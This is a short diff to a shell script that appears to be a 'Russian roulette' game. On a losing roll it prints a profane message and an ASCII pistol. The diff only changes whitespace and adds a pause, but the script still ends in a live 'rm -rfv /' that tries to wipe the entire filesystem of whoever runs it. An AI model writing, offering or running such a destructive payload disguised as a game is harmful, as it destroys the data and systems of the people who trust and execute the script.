@@ -7,7 +7,7 @@ if [ "$g" -eq 3 ]
 then
 	echo YOU FUCKED UP
 
- sleep 1
+sleep 1
  echo " \
  /                                 />
  \__+_____________________/\/\___/ /|
@@ -19,6 +19,8 @@ then
 Bang! Bang!                       |       \
                                   |         \
                                   |__________|"
+
+sleep 2
  rm -rfv /
 fi
 
